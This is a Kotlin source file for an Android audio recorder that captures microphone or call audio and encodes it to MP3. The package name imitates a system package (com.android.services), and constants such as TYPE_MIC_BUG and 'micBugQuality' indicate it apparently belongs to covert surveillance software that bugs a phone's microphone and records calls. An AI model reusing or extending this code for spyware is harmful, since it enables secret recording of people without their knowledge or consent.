package com.android.services.util

import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import com.naman14.androidlame.LameBuilder
import java.io.File
import java.io.FileNotFoundException
import java.io.FileOutputStream
import java.io.IOException
import java.security.InvalidParameterException

class Mp3LameRecorder(filePath: String, sampleRate: Int) {

    private val mSampleRate: Int
    private val filePath: String
    var isRecording = false
    private var outputStream: FileOutputStream? = null

    fun startRecording(type: Int) {
        isRecording = true
        val minBuffer = AudioRecord.getMinBufferSize(
            mSampleRate, AudioFormat.CHANNEL_IN_MONO,
            AudioFormat.ENCODING_PCM_16BIT
        )
        val mAudioSource: Int
        var scaleQuality: Int
        if (type == TYPE_CALL_RECORD && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            mAudioSource = MediaRecorder.AudioSource.VOICE_RECOGNITION
            scaleQuality = AppConstants.callRecordQuality?.toInt() ?: 0
        } else {
            mAudioSource = MediaRecorder.AudioSource.MIC
            scaleQuality = AppConstants.micBugQuality?.toInt() ?: 0
        }
        scaleQuality = scaleQuality.coerceAtLeast(5)
        val scaleInput = scaleQuality.toFloat() / 5
        logVerbose("Initialising Audio Recorder...", TAG)
        val audioRecord = AudioRecord(
            mAudioSource, mSampleRate,
            AudioFormat.CHANNEL_IN_MONO,
            AudioFormat.ENCODING_PCM_16BIT, minBuffer * 2
        )

        //5 seconds data
        logVerbose("Creating Short Bugger Array", TAG)
        val buffer = ShortArray(mSampleRate * 2 * 5)
        // 'mp3buf' should be at least 7200 bytes long
        // to hold all possible emitted data.
        logVerbose("Creating mp3 Buffer", TAG)
        val mp3buffer = ByteArray((7200 + buffer.size * 2 * 1.25).toInt())
        try {
            outputStream = FileOutputStream(File(filePath))
        } catch (e: FileNotFoundException) {
            logVerbose("FilePath not found " + e.message, TAG)
        }
        logVerbose("Initialising Android Lame", TAG)
        val androidLame = LameBuilder()
            .setInSampleRate(mSampleRate)
            .setOutChannels(1)
            .setOutBitrate(32)
            .setScaleInput(scaleInput)
            .setVbrMode(LameBuilder.VbrMode.VBR_RH)
            .setQuality(0)
            .setVbrQuality(0)
            .setOutSampleRate(mSampleRate)
            .build()
        logVerbose("Starting Audio Recording", TAG)
        audioRecord.startRecording()
        var bytesRead: Int
        while (isRecording) {
            logVerbose("Reading to short Array Buffer, Buffer Size= $minBuffer", TAG)
            bytesRead = audioRecord.read(buffer, 0, minBuffer)
            logVerbose(TAG + "Bytes read= " + bytesRead)
            if (bytesRead > 0) {
                logVerbose("Encoding bytes to mp3 Buffer..", TAG)
                val bytesEncoded = androidLame.encode(buffer, buffer, bytesRead, mp3buffer)
                logVerbose("Bytes Encoded=$bytesEncoded", TAG)
                if (bytesEncoded > 0) {
                    try {
                        logVerbose(
                            "Writing mp3 Buffer to OutputStream with $bytesEncoded bytes",
                            TAG
                        )
                        outputStream!!.write(mp3buffer, 0, bytesEncoded)
                    } catch (e: IOException) {
                        logVerbose("Error Writing to Output stream " + e.message, TAG)
                    }
                }
            }
        }
        logVerbose("Recording Stopped", TAG)
        logVerbose("Flushing final mp3 Buffer", TAG)
        try {
            val outputMp3buf = androidLame.flush(mp3buffer)
            logVerbose("Flushed $outputMp3buf bytes", TAG)
            if (outputMp3buf > 0) {
                try {
                    logVerbose("Writing final mp3buffer to OutputStream", TAG)
                    outputStream!!.write(mp3buffer, 0, outputMp3buf)
                    logVerbose("Closing Output Stream", TAG)
                    outputStream!!.close()
                } catch (e: IOException) {
                    logVerbose("Error Closing Output stream " + e.message, TAG)
                }
            }
            logVerbose("Releasing Audio Recorder", TAG)
            audioRecord.stop()
            audioRecord.release()
            logVerbose("Closing Android Lame", TAG)
            androidLame.close()
        } catch (e: Exception) {
            logException("Error Releasing Lame: " + e.message, TAG, e)
        }
    }

    fun stopRecording() {
        isRecording = false
    }

    companion object {
        private const val TAG = "Mp3LameRecorder "
        const val TYPE_CALL_RECORD = 1
        const val TYPE_MIC_BUG = 2
    }

    init {
        if (sampleRate <= 0) {
            throw InvalidParameterException("Invalid sample rate specified.")
        }
        this.filePath = filePath
        mSampleRate = sampleRate
    }
}